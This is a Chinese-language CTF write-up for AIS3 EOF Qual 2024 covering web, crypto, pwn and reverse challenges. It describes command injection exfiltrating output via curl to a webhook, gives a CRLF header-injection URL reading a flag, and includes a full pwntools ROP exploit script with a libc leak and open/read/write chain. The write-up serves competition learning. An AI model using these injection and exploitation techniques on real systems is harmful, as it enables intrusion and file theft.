---
title: AIS3 EOF Qual 2024 writeup
date: 2024-01-21 23:10:07
tags: AIS3 CTF
---
## Web
### DNS Lookup Tool: Final
一開始想說用 \`\` 來做截斷
後面發現其實只要 $()抱著就可以用ㄌ
然後後面用 curl 到 webhook 在就能輸指令了
但後面遇到一個情況就是他指令的輸出不能包含空格或是換行
而且 flag 文件也不叫 flag 所以不能直接上傳到其他地方 這我還發ticket 問QQ

最後是用 POST -d 把 ls 的東西弄到 webhook 上後
![1000000420](https://hackmd.io/_uploads/H1KdEGK_a.png)

再去 cat flag

### Internal
有找到一篇 Orange 的 writeup
https://blog.orange.tw/2014/02/olympic-ctf-2014-curling-200-write-up.html?m=1

所以輸入`http://10.105.0.21:11181/?redir=https://google.com/%0d%0aX-Accel-Redirect:/flag`


## Crypto
### Baby RSA
透過大一上學期的離散課程
知道中國餘式定理的算法

然後就看了一下 Edu-Ctf 的影片
知道說如果密文相同有 n1, n2, n3 和 c1, c2, c3 便能解出密文
利用一個叫做 broadcast attack 的東西
利用 sage 就能解開了
![螢幕擷取畫面 2024-01-06 140212](https://hackmd.io/_uploads/rk6Hlydu6.png)


## Pwn
### jackpot
首先 他會先輸入一個數字 然後那個數字可以把 stack 中的東西輸出出來
透過 gdb 跑到定位後 然後輸出 stack 找到 __libc_start_main+2XX

然後就能夠透過這個 去剪掉 0x29d90 去拿到 libc 的 base address

然後就能夠去串 ROP 做 ORW 了

不過由於它的長度限制 0x100 所以當初我修改了很久讓他滿足長度
把該拔的拔掉
還有 flag 字串有出現在程式中所以我直接拿來使用
最後就能拿到 flag 了

```py=
from pwn import *
from time import *

# context(arch='i386', os='linux', log_level='debug')
context(arch = 'amd64', os = 'linux')

context.terminal = ['tmux', 'splitw', '-h']
#r = remote("172.18.0.2", 1224)
#r = remote("10.105.0.21" ,12978)
#r = process("./jackpot")
r = remote("10.105.0.21", 12767)
lib = ELF("./libc.so.6")
#lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
r.recvuntil(b': ')
r.sendline("31")
r.recvuntil('ticket')
a = int(r.recv(16), 16)
print(hex(a))
#libc = int(r.recvline()[:-1], 16) - 0x29d90
#print(hex(libc))
libc = a - 0x29d90
#gdb.attach(r)
r.recvuntil(":")

exita = 0x0401120
leave = 0x0401438
bss = 0x0000000000404180

pop_rsi = libc + 0x000000000002be51
pop_rdi = libc + 0x000000000002a3e5
pop_rdx = libc + 0x00000000000796a2
flag = 0x040201f

sys_write = libc + lib.sym['write']
sys_open = libc + lib.sym['open']
sys_read = libc + lib.sym['read']
#gdb.attach(r)

r.sendline(b"A" * (0x78) + flat(
  pop_rdi, flag,
  pop_rsi, 0,
  sys_open,
  pop_rdi, 3,
  pop_rsi, bss + 0x50,
  pop_rdx, 0x30,
  sys_read,
  pop_rdi, 1,
  #pop_rsi, bss + 0x50,
  sys_write,
  leave
))
a = r.recvline()

print(a)
#a = r.recv()
#print(a)
r.interactive()
```
![image](https://hackmd.io/_uploads/ByJ7Myu_6.png)


## Reverse

### Flag Generator
打開之後他會把一個 exe 的所有資料寫在 memory 中然後再刪掉
所以只要在他刪掉前 把記憶體內容弄出來 執行 就能拿到 flag 了
![image](https://hackmd.io/_uploads/HyC5MJOdT.png)


### PixelClicker
看到這題我第一個想到的是 flareOn9 的一題
然後原本以為他上面寫的是位置後面才發現原來是顏色
decompile後以為照他上面寫的 只要按兩次就能拿到flag
然後發現它裡面有一塊會用來決定是否符合的顏色
![image](https://hackmd.io/_uploads/H11imkdOp.png)
r9d 是自己的內容
rax 是他比較的內容
原本寫了一個程式來按照順序讓他點出每次點哪個點
標成黑色
後面發現少看一塊code
![image](https://hackmd.io/_uploads/BywgEk__p.png)

```py=


from PIL import Image

def process_image(input_image_path, output_image_path, color_list_path):
    # 讀取圖片
    image = Image.open(input_image_path)
    width, height = 2000, 2000

    # 讀取顏色列表
    with open("a.bin", 'rb') as f:
        data = f.read()

    print(hex(data[0]))
    color_list = []
    print(len(data))
    for i in range(int(len(data) / 4)):
        a = [data[4 * i], data[4 * i + 1], data[4*i+2], data[4*i+3]]
        b = tuple(a)
        color_list.append(b)
    # 創建一個新的圖片，初始全部為白色
    new_image = Image.new('RGB', (width, height), 'white')
    for i in range(0, len(color_list)):
        a = i % 600 + 0x28a
        b = int(i / 600)
        print(a, b)
        new_image.putpixel(((b, a)), (color_list[i][0], color_list[i][1], color_list[i][2]))
        #new_image.putpixel((x, y), (0, 0, 0))  # 標記為黑色
    new_image.save(output_image_path)

    # 儲存新的圖片
    

if __name__ == "__main__":
    input_image_path = "pix.png"  # 輸入圖片的路徑
    output_image_path = "output_image.jpg"  # 輸出圖片的路徑
    color_list_path = "a.txt"  # 顏色列表的路徑

    process_image(input_image_path, output_image_path, color_list_path)
```
程式寫出來 搞定
![image](https://hackmd.io/_uploads/Sy3yggOdT.png)


### Stateful
也跟 FlareOn9 某題很像
就把他的code 弄出來
然後在每個會對字串做更動的函數讓他輸出他是第幾個
發現 ghidra 弄出來的順序就是他執行的順序
共有50 個函數
然後把 + 變成 - 到回去執行就有了
工人智慧的勝利
```cpp=
#include <bits/stdc++.h>
using namespace std;

vector<int> param_1;

void state_1978986903()

{
  cout << 51 << '\n';
  param_1[5] = param_1[5] - param_1[0x14] - param_1[0x25];
  return;
}

void state_3648003850()

{
  cout << 50 << '\n';
  param_1[8] = param_1[8] - param_1[0x10] - param_1[0xe];
  return;
}

void state_3420754995()

{
  cout << 49 << '\n';
  param_1[0x11] = param_1[0x11] - param_1[0x18] - param_1[0x26];
  return;
}

void state_557589375()

{
  cout << 48 << '\n';
  param_1[0xf] = param_1[0xf] - param_1[8] - param_1[0x28];
  return;
}

void state_71198295()

{
  cout << 47 << '\n';
  param_1[0x25] = param_1[0x25] - param_1[0x10] - param_1[0xc];
  return;
}


void state_126130845()

{
  cout << 46 << '\n';
  param_1[4] = param_1[4] - param_1[0x16] - param_1[6];
  return;
}


void state_3901233957()

{
  cout << 45 << '\n';
  param_1[10] = param_1[10] + (param_1[0x16] + param_1[0xc]);
  return;
}

void state_1843624184()

{
  cout << 44 << '\n';
  param_1[0x12] = param_1[0x12] - param_1[0x1f] - param_1[0x1a];
  return;
}

void state_794507810()

{
  cout << 43 << '\n';
  param_1[0x17] = param_1[0x17] - param_1[0x27] - param_1[0x1e];
  return;
}

void state_4130555047()

{
  cout << 42 << '\n';
  param_1[4] = param_1[4] - param_1[0x19] - param_1[0x1b];
  return;
}

void state_1929982570()

{
  cout << 41 << '\n';
  param_1[0x25] = param_1[0x25] - param_1[0x12] - param_1[0x1b];
  return;
}

void state_3907553856()

{
  cout << 40 << '\n';
  param_1[0x29] = param_1[0x29] + (param_1[0x22] + param_1[3]);
  return;
}


void state_3507844042()

{
  cout << 39 << '\n';
  param_1[0xd] = param_1[0xd] - param_1[8] - param_1[0x1a];
  return;
}

void state_2907124712()

{
  cout << 38 << '\n';
  param_1[2] = param_1[2] - param_1[0x19] - param_1[0x22];
  return;
}

void state_2316743832()

{
  cout << 37 << '\n';
  param_1[0] = param_1[0] - param_1[0x1f] - param_1[0x1c];
  return;
}

void state_1595228866()

{
  cout << 36 << '\n';
  param_1[4] = param_1[4] - param_1[0x19] - param_1[7];
  return;
}

void state_1093244921()

{
  cout << 35 << '\n';
  param_1[0x12] = param_1[0x12] - param_1[0xf] - param_1[0x1d];
  return;
}

void state_809393455()

{
  cout << 34 << '\n';
  param_1[0x15] = param_1[0x15] + (param_1[0x2a] + param_1[0xd]);
  return;
}
void state_1154341356()

{
  cout << 33 << '\n';
  param_1[0x15] = param_1[0x15] - param_1[0xf] - param_1[0x22];
  return;
}

void state_3656605789()

{
  cout << 32 << '\n';
  param_1[7] = param_1[7] - param_1[0] - param_1[10];
  return;
}

void state_4165665722()

{
  cout << 31 << '\n';
  param_1[0xd] = param_1[0xd] - param_1[0x1c] - param_1[0x19];
  return;
}

void state_2816834243()

{
  cout << 30 << '\n';
  param_1[0x20] = param_1[0x20] - param_1[0x19] - param_1[5];
  return;
}

void state_2095151013()

{
  cout << 29 << '\n';
  param_1[0x1f] = param_1[0x1f] - param_1[0x10] - param_1[1];
  return;
}

void state_3908914479()

{
  cout << 28 << '\n';
  param_1[1] = param_1[1] - param_1[0x28] - param_1[0x10];
  return;
}

void state_2309210106()

{
  cout << 27 << '\n';
  param_1[0x1e] = param_1[0x1e] + (param_1[2] + param_1[0xd]);
  return;
}

void state_4008735947()

{
  cout << 26 << '\n';
  param_1[1] = param_1[1] - param_1[6] - param_1[0xf];
  return;
}

void state_3544494813()

{
  cout << 25 << '\n';
  param_1[7] = param_1[7] - param_1[0] - param_1[0x15];
  return;
}

void state_4046605750()

{
  cout << 24 << '\n';
  param_1[0x18] = param_1[0x18] - param_1[5] - param_1[0x14];
  return;
}

void state_1780152111()

{
  cout << 23 << '\n';
  param_1[0x24] = param_1[0x24] - param_1[0xf] - param_1[0xb];
  return;
}

void state_269727185()

{
  cout << 22 << '\n';
  param_1[0] = param_1[0] - param_1[0x10] - param_1[0x21];
  return;
}

void state_4237907356()

{
  cout << 21 << '\n';
  param_1[0x13] = param_1[0x13] - param_1[0x10] - param_1[10];
  return;
}

void state_2098792827()

{
  cout << 20 << '\n';
  param_1[1] = param_1[1] + (param_1[0xd] + param_1[0x1d]);
  return;
}

void state_3443361864()

{
  cout << 19 << '\n';
  param_1[0x1e] = param_1[0x1e] + (param_1[8] + param_1[0x21]);
  return;
}

void state_1132589236()

{
  cout << 18 << '\n';
  param_1[0xf] = param_1[0xf] - param_1[10] - param_1[0x16];
  return;
}

void state_2131447726()

{
  cout << 17 << '\n';
  param_1[0x14] = param_1[0x14] - param_1[0x18] - param_1[0x13];
  return;
}

void state_1765279360()

{
  cout << 16 << '\n';
  param_1[0x1b] = param_1[0x1b] - param_1[0x14] - param_1[0x12];
  return;
}

void state_4026467378()

{
  cout << 15 << '\n';
  param_1[0x27] = param_1[0x27] + (param_1[0x26] + param_1[0x19]);
  return;
}

void state_2202680315()

{
  cout << 14 << '\n';
  param_1[0x17] = param_1[0x17] - param_1[0x22] - param_1[7];
  return;
}

void state_2373489361()

{
  cout << 13 << '\n';
  param_1[0x25] = param_1[0x25] + (param_1[3] + param_1[0x1d]);
  return;
}

void state_416430256()

{
  cout << 12 << '\n';
  param_1[5] = param_1[5] - param_1[4] - param_1[0x28];
  return;
}

void state_2421543205()

{
  cout << 11 << '\n';
  param_1[0x11] = param_1[0x11] - param_1[7] - param_1[0];
  return;
}

void state_3844354947()

{
  cout << 10 << '\n';
  param_1[9] = param_1[9] - param_1[3] - param_1[0xb];
  return;
}

void state_3995931083()

{
  cout << 9 << '\n';
  param_1[0x1f] = param_1[0x1f] - param_1[0x10] - param_1[0x22];
  return;
}

void state_2263885268()

{
  cout << 7 << '\n';
  param_1[0xe] = param_1[0xe] + (param_1[6] + param_1[0x20]);
  return;
}



void state_4260333374()

{
  cout << 8 << '\n';
  param_1[0x10] = param_1[0x10] - param_1[0xb] - param_1[0x19];
  return;
}

void state_1438496410()

{
  cout << 5 << '\n';
  param_1[6] = param_1[6] - param_1[0x29] - param_1[10];
  return;
}

void state_2357240312()

{
  cout << 4 << '\n';
  param_1[2] = param_1[2] - param_1[8] - param_1[0xb];
  return;
}

void state_671274660()

{
  cout << 3 << '\n';
  param_1[0] = param_1[0] + (param_1[0x1f] + param_1[0x12]);
  return;
}

void state_2057902921()

{
  cout << 2 << '\n';
  param_1[9] = param_1[9] + (param_1[0x16] + param_1[2]);
  return;
}

void state_3618225054()

{
  cout << 1 << '\n';
  param_1[0xe] = param_1[0xe] - param_1[8] - param_1[0x23];
  return;
}


int main() {
    int a[] = { 0xe1, 0xda, 0xac, 0x33, 0x67, 0x5d, 0xf4, 0x18, 0x0d, 0x42, 0x85, 0x55, 0x5f, 0xc4, 0xb3, 0x81, 0xfb, 0x81, 0x1b, 0x70, 0xdb, 0x34, 0x4c, 0x5d, 0xed, 0x52, 0x5f, 0xf0, 0x74, 0x40, 0x89, 0x56, 0x80, 0x45, 0x53, 0x35, 0xa3, 0xa0, 0x37, 0xdd, 0x33, 0xcc, 0x7d };
    for(int i = 0; i < 43; i++)
        param_1.push_back(a[i]);
    state_1978986903();
    state_3648003850();
    state_3420754995();
    state_557589375();
    state_71198295();
    state_126130845();
    state_3901233957();
    state_1843624184();
    state_794507810();
    state_4130555047();
    state_1929982570();
    state_3907553856();
    state_3507844042();
    state_2907124712();
    state_2316743832();
    state_1595228866();
    state_1093244921();
    state_809393455();
    state_1154341356();
    state_3656605789();
    state_4165665722();
    state_2816834243();
    state_2095151013();
    state_3908914479();
    state_2309210106();
    state_4008735947();
    state_3544494813();
    state_4046605750();
    state_1780152111();
    state_269727185();
    state_4237907356();
    state_2098792827();
    state_3443361864();
    state_1132589236();
    state_2131447726();
    state_1765279360();
    state_4026467378();
    state_2202680315();
    state_2373489361();
    state_416430256();
    state_2421543205();
    state_3844354947();
    state_3995931083();
    state_2263885268();
    state_4260333374();
    state_1438496410();
    state_2357240312();
    state_671274660();
    state_2057902921();
    state_3618225054();

    for(int i = 0; i < 43; i++)
        cout << char(param_1[i]) << ' ';

}
```


### Bam
沒解出來的
拿 source code 去做比較 發現他有藏一個 backdoor 
然後她會拿它裡面的東西
\$1337$ 來作為標記尋找
把後面兩段用 $ 切割丟進去
然後作一系列操作後會剩下一個長度為16 的陣列
拿一個 hash 值 跟一個 urandom 出來的陣列做 xor 去比較如果跟那個陣列一樣即可
但我不知道hash 跟 urandom 的東西怎麼拿出來zzzz

我好爛喔QQ